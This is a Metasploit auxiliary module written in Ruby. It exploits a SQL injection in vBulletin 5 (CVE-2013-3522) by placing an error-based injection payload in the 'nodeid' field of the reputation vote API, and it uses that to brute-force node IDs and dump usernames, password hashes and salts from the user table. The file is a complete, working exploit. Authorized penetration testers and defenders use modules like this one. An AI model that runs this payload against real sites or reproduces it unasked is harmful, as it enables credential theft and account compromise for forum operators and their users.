##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'vBulletin Password Collector via nodeid SQL Injection',
      'Description'    => %q{
        This module exploits a SQL Injection vulnerability found in vBulletin 5 that has been
        used in the wild since March 2013. This module can be used to extract the web application's
        usernames and hashes, which could be used to authenticate into the vBulletin admin control
        panel.
      },
      'References'     =>
        [
          [ 'CVE', '2013-3522' ],
          [ 'OSVDB', '92031' ],
          [ 'EDB', '24882' ],
          [ 'BID', '58754' ],
          [ 'URL', 'http://www.zempirians.com/archive/legion/vbulletin_5.pl.txt' ]
        ],
      'Author'         =>
        [
          'Orestis Kourides', # Vulnerability discovery and PoC
          'sinn3r', # Metasploit module
          'juan vazquez' # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => "Mar 24 2013"
    ))

    register_options(
      [
        OptString.new("TARGETURI", [true, 'The path to vBulletin', '/']),
        OptInt.new("NODE", [false, 'Valid Node ID']),
        OptInt.new("MINNODE", [true, 'Valid Node ID', 1]),
        OptInt.new("MAXNODE", [true, 'Valid Node ID', 100])
      ], self.class)
  end

  def exists_node?(id)
    mark = Rex::Text.rand_text_alpha(8 + rand(5))
    result = do_sqli(id, "select '#{mark}'")

    if result and result =~ /#{mark}/
      return true
    end

    return false
  end

  def brute_force_node
    min = datastore["MINNODE"]
    max = datastore["MAXNODE"]

    if min > max
      print_error("#{peer} - MINNODE can't be major than MAXNODE")
      return nil
    end

    for node_id in min..max
      if exists_node?(node_id)
        return node_id
      end
    end

    return nil
  end

  def get_node
    if datastore['NODE'].nil? or datastore['NODE'] <= 0
      print_status("#{peer} - Brute forcing to find a valid node id...")
      return brute_force_node
    end

    print_status("#{peer} - Checking node id #{datastore['NODE']}...")
    if exists_node?(datastore['NODE'])
      return datastore['NODE']
    else
      return nil
    end
  end

  # session maybe isn't needed, unauthenticated
  def do_sqli(node, query)
    mark = Rex::Text.rand_text_alpha(5 + rand(3))
    random_and = Rex::Text.rand_text_numeric(4)
    injection = ") and(select 1 from(select count(*),concat((select (select concat('#{mark}',cast((#{query}) as char),'#{mark}')) "
    injection << "from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) "
    injection << "AND (#{random_and}=#{random_and}"

    res = send_request_cgi({
      'method'    => 'POST',
      'uri'       => normalize_uri(target_uri.path, "index.php", "ajax", "api", "reputation", "vote"),
      'vars_post' =>
        {
          'nodeid'  => "#{node}#{injection}",
        }
      })

    unless res and res.code == 200 and res.body.to_s =~ /Database error in vBulletin/
      return nil
    end

    data = ""

    if res.body.to_s =~ /#{mark}(.*)#{mark}/
      data = $1
    end

    return data
  end

  def get_user_data(node_id, user_id)
    user = do_sqli(node_id, "select username from user limit #{user_id},#{user_id+1}")
    pass = do_sqli(node_id, "select password from user limit #{user_id},#{user_id+1}")
    salt = do_sqli(node_id, "select salt from user limit #{user_id},#{user_id+1}")

    return [user, pass, salt]
  end

  def check
    node_id = get_node

    unless node_id.nil?
      return Msf::Exploit::CheckCode::Vulnerable
    end

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, "index.php")
    })

    if res and res.code == 200 and res.body.to_s =~ /"simpleversion": "v=5/
      return Msf::Exploit::CheckCode::Detected
    end

    return Msf::Exploit::CheckCode::Unknown
  end

  def run
    print_status("#{peer} - Checking for a valid node id...")
    node_id = get_node
    if node_id.nil?
      print_error("#{peer} - node id not found")
      return
    end

    print_good("#{peer} - Using node id #{node_id} to exploit sqli... Counting users...")
    data = do_sqli(node_id, "select count(*) from user")
    if data.blank?
      print_error("#{peer} - Error exploiting sqli")
      return
    end
    count_users = data.to_i
    print_good("#{peer} - #{count_users} users found")

    users_table = Rex::Ui::Text::Table.new(
      'Header'  => 'vBulletin Users',
      'Ident'   => 1,
      'Columns' => ['Username', 'Password Hash', 'Salt']
    )

    for i in 0..count_users
      user = get_user_data(node_id, i)
      report_auth_info({
       :host => rhost,
       :port => rport,
       :user => user[0],
       :pass => user[1],
       :type => "hash",
       :sname => (ssl ? "https" : "http"),
       :proof => "salt: #{user[2]}" # Using proof to store the hash salt
      })
      users_table << user
    end

    print_line(users_table.to_s)
  end


end

